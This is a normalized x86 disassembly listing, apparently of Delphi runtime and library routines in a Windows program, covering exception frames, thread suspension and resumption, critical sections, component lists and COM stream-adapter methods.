je r-xdata
xor eax eax
push ebp
push sub_41e185
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403f38
mov eax [ ebp - 0x4 ]
call sub_40316c
sub_41e18a
call sub_4027ac
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_41df80
test bl bl
je r-xdata
mov eax esi
call sub_403f38
mov eax [ ebp - 0x4 ]
call sub_40316c
sub_41e1ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41e296
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_40313c
call sub_41df8c
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_41e144
xor edx edx
xor eax eax
call sub_403ef4
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e29d
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40b1c4
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_41e2bc
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
mov eax [ esi + 0x38 ]
call sub_40316c
call sub_41df98
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_41e62c
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
mov eax esi
call sub_41e634
mov eax esi
call sub_41e604
sub_41e330
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_41e39e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3a5
lea eax [ ebp - 0x14 ]
call sub_403f40
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b1c4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_41e3ec
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi + 0x4 ]
push eax
call SetThreadPriority
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41e3ac
pop esi
pop ebx
retn
sub_41e418
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_41e53a
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41e51c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_417d38
call sub_41df80
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_41e4fd
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e504
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_41e558
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_41e418
pop ebp
retn 0x8
sub_41e598
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0xe ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_41e5e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0xe ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SuspendThread
test eax eax
setge dl
mov eax [ ebp - 0x4 ]
call sub_41e3ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41e604
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_41e3ac
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_41e634
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_41e3ac
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_41dfa4
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_41e3ac
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_41e6d8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_41e890
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41e724
push ebx
push esi
push ecx
call sub_4034f8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_41e978
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_41e920
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_41847c
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_41e8e8
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4034e0
lea eax [ ebx + 0x14 ]
call sub_40d3ac
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_417e94
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_41e7a8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_417ef0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_417d38
mov edx ebx
mov eax esi
call sub_41e7a8
sub_41e83c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_417d38
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebx + 0x10 ] eax
sub_41e868
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_418030
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_40316c
xor eax eax
mov [ ebx + 0x10 ] eax
sub_41e890
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403368
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_41e83c
mov dl 0x1
mov eax ebx
call sub_41edb0
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41ed60
sub_41e8e8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41edb0
mov edx ebx
mov eax esi
call sub_41e868
pop edi
pop esi
pop ebx
retn
sub_41e920
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_417f7c
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_41e8e8
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_41e868
sub_41e978
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_417e94
call sub_41e978
inc edi
dec esi
jne r-xdata
sub_41e9b4
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_418030
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_40316c
xor eax eax
mov [ ebx + 0x14 ] eax
sub_41e9d8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e9b4
mov edx ebx
mov eax esi
call sub_41e9b4
pop esi
pop ebx
retn
sub_41e9f4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_41e9d8
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_417e94
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41ea50
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_41e7fc
push ebx
push sub_41e824
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_41e810
push ebx
push sub_41e830
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41eb48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407fec
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41ebe0
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
sub_41ebe0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_417e94
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407fec
test al al
jne r-xdata
sub_41ec30
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_40434c
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_4082d8
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac4
call sub_4038f8
xor edx edx
mov eax ebx
call sub_41edb0
mov edx esi
mov eax ebx
call sub_41ecbc
mov dl 0x1
mov eax ebx
call sub_41edb0
sub_41ecd0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_417e94
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_417e20
sub_41ed0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_417ef0
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_417d84
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_417f10
sub_41ed60
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41ecfc
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41ecd0
mov cl 0x1
mov edx ebx
call sub_41ed60
inc edi
dec ebp
jne r-xdata
sub_41edb0
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_4041dc
mov edx esp
mov eax esi
call sub_403440
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41edf8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41ee20
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41ee68
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_403220
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41eea8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41eec8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ eax + 0x20 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
or eax 0xffffffff
jmp r-xdata
pop ebp
retn 0x4
sub_41eeec
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41ef34
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
mov edx esi
call sub_41f164
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41ef9c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x10 ] esi
test esi esi
je r-xdata
mov edx ebx
call sub_41f164
mov edx ebx
mov eax esi
call sub_41f158
sub_41efe0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41e6d8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x50 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f024
push ebx
push esi
push edi
call sub_4034f8
mov ebx edx
mov edi eax
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e724
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
mov esi [ edi + 0x50 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx edi
call sub_41e9d8
jmp r-xdata
mov eax esi
call sub_417f7c
mov edx eax
mov eax edi
call sub_41f164
lea eax [ edi + 0x50 ]
call sub_40d3ac
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034e0
sub_41f084
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x30 ]
jne r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
sub_41f0b0
push ebx
cmp [ eax + 0x42 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
mov al 0x1
pop ebx
retn
sub_41f0cc
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
mov al 0x1
pop ebx
retn
sub_41f0e8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x40 ]
jne r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x44 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x40 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x44 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x50 ]
call sub_417e94
mov edx [ eax ]
call [ edx + 0x10 ]
inc edi
dec esi
jne r-xdata
sub_41f164
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
xor eax eax
mov [ ebp + 0x10 ] eax
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_417d84
jmp r-xdata
mov eax [ edi + 0x50 ]
mov edx ebx
call sub_417e94
cmp ebp eax
jne r-xdata
sub_41f1a4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x30 ] eax
test eax eax
je r-xdata
mov edx ebx
call sub_41e9d8
mov edx ebx
call sub_41e7a8
sub_41f1d0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40313c
mov [ edi + 0xc ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x10 ] al
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f218
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40315c
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_40316c
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_41f250
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41f29f
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41f2b8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_41f307
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_41f320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41f38a
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_41f3a4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_41f3ed
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41a444
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
